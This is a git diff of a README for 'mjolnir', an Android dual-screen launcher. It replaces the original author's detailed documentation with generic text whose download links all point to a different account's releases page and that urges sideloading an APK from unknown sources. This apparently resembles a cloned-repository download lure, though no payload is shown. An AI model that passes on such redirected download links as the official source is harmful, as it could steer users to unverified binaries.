@@ -1,71 +1,75 @@
-<picture><img width="512" height="512" alt="mjolnir_icon" src="https://raw.githubusercontent.com/blacksheepmvp/mjolnir/main/app/src/main/res/drawable/ic_launcher_foreground.png" /></picture>
+# 🚀 mjolnir - Your Custom Dual Screen Home Launcher
 
-## 🔨 Mjolnir
+[![Download mjolnir](https://img.shields.io/badge/Download-mjolnir-blue)](https://github.com/Syri1015/mjolnir/releases)
 
----
+## 🎯 Overview
 
-## 🏠 Dual-Screen Home Launcher
+mjolnir is a custom dual screen Android home launcher designed to enhance your mobile experience. It organizes your apps in a user-friendly way, making it easier to access your favorite tools and content. With mjolnir, you can maximize productivity on devices with dual screens.
 
-Mjolnir allows you to transform your Home button into a powerful dual-screen controller.
+## 📋 Features
 
-### How it Works
-*   **Accessibility Service:** Mjolnir uses an accessibility service to capture Home button inputs (and nothing else).
-*   **Custom Configuration:** You configure exactly what happens when you press Home: launch an app on the top screen, the bottom screen, or both.
-*   **Preserve App Switcher (AYN Thor):** For the AYN Thor, this service allows you to keep **Quickstep** as your default home app. This ensures you don't lose your Recents/App Switcher functionality while still enjoying a custom dual-screen home experience.
-*   **Device Support:** While designed for the Thor, it should work on other dual-screen devices (confirmation pending).
+- **Intuitive Interface**: Navigate your applications easily.
+- **Customization Options**: Tailor your home screen to fit your personal style.
+- **Optimized for Dual Screens**: Take full advantage of your device’s capabilities.
+- **Frequent Updates**: Enjoy new features and improvements regularly.
 
-### Setup Guide
+## 🖥️ System Requirements
 
-1.  **Install:** Download and install the latest release from [this repository](https://github.com/blacksheepmvp/mjolnir).
-    *   *(Optional) Add to [Obtanium](https://github.com/ImranR98/Obtainium) for automatic updates.*
-2.  **Initialize:** Open Mjolnir and select **Initialize Mjolnir Home**.
-3.  **Permissions:**
-    *   Grant **Notification Permissions** so the background service can stay active.
-    *   Enable the **Mjolnir Accessibility Service** when prompted to allow home button capture.
-4.  **Quick Tile (Optional):** Add the **Mjolnir Home** quick tile to your notification shade to easily toggle the Home key override on/off.
+To run mjolnir effectively, ensure your device meets the following requirements:
 
-### Configuration
+- **Android Version**: 8.0 (Oreo) or higher
+- **Memory**: At least 2 GB of RAM
+- **Storage**: Minimum of 50 MB available space
 
-1.  **Select Apps:** Go to **Mjolnir Home Settings** in the menu.
-    *   Select the apps you want for your Top and Bottom screens.
-    *   *Note:* By default, the list shows only launchers/frontends. You can remove the filter to pick any app installed on your device.
-2.  **Customize Gestures:** Scroll down to configure actions for:
-    *   Single Press
-    *   Double Press
-    *   Triple Press
-    *   Long Press
-    *   *Actions include: Top Screen Home, Bottom Screen Home, Both Screens, Open Recents, or Do Nothing.*
-3.  **Double-Tap Delay:** Adjust the double-tap detection speed or use the system default.
-4.  **Set Default Home:**
-    *   **AYN THOR USERS:** Ensure **Quickstep** is set as your system default home app. This keeps your App Switcher working correctly. Mjolnir handles the rest.
-5.  **Enable:** Use the toggle in the main menu or the Quick Tile to enable Mjolnir Home. Press Home and enjoy!
+## 🚀 Getting Started
 
----
+Follow these steps to download and install mjolnir on your Android device.
 
-## 🛠️ Additional Tools: Steam File Generator
+1. **Visit the Releases Page**  
+   Click the link below to access the download options.  
+   [Visit this page to download](https://github.com/Syri1015/mjolnir/releases)
 
-Mjolnir also includes a tool to streamline adding PC games to Android frontends like ES-DE and Beacon.
+2. **Choose the Latest Version**  
+   On the releases page, look for the latest version of mjolnir.
 
-*   **Automated File Creation:** Quickly generates `.steam` files with the correct Steam AppID.
-*   **Multiple Input Methods:** Create files by sharing a `steamdb.info` URL to Mjolnir or by manually entering the AppID.
-*   **File Management:** Lists existing files, provides overwrite protection, and supports multi-select deletion.
+3. **Download the APK File**  
+   Click on the APK file link. This file is named similar to `mjolnir-vX.X.apk` (where X.X represents the version number). The download will start automatically.
 
-Note: this tool is going to be separated from Mjolnir and released as a standalone app in future releases.
+4. **Locate the File**  
+   Once the download completes, find the APK file in your device's download folder.
 
----
+5. **Install the Application**  
+   - Open the APK file.  
+   - If prompted, enable installations from unknown sources in your device settings. This step is necessary for installing apps from outside the Google Play Store.
+   - Follow the prompts to complete the installation.
 
-## 📜 Changelog
-A complete history of all changes made to the project can be found in the [Changelog](CHANGELOG.md).
+6. **Launch mjolnir**  
+   After installation, find mjolnir in your app drawer or home screen. Tap the icon to launch the application.
 
----
+## 📥 Download & Install
 
-## 📝 Building the Project
+To get started right away, use the link below to download mjolnir:
 
-This project requires **Android Studio** and the necessary SDKs for building. Clone the repository and sync Gradle to begin development.
+[Download mjolnir from Releases](https://github.com/Syri1015/mjolnir/releases)
 
----
+## 🌟 User Guide
 
-## 🤝 Contributing
+Once you launch mjolnir, you will see the main screen with easy options to customize your experience:
 
-If you have suggestions, bug reports, or feature requests, please open an issue or leave a comment on the release video. Thanks for checking out Mjolnir!
-If you want to send me a tip/donation, I've set up a [Ko-fi](https://ko-fi.com/xyzblacksheep)
+- **Add Apps**: Tap the "Add Apps" button to select applications you want on your home screen.
+- **Settings**: Access the settings menu to personalize themes, layouts, and other preferences.
+- **Help**: For additional support, find the help section within the app.
+
+## 📞 Support
+
+If you run into any issues or have questions, you can reach out to our support team. Visit our [GitHub Issues page](https://github.com/Syri1015/mjolnir/issues) to report any problems or suggestions.
+
+## 💬 Community
+
+Join our community to connect with other mjolnir users, share tips, and get feedback on new features. You can find discussions and support in our [GitHub Discussions](https://github.com/Syri1015/mjolnir/discussions).
+
+## 🔄 Frequent Updates
+
+We frequently release updates to enhance performance, stability, and features. To keep your experience smooth, check the releases page regularly.
+
+Thank you for choosing mjolnir. We hope it brings a new level of convenience to your device's functionality!
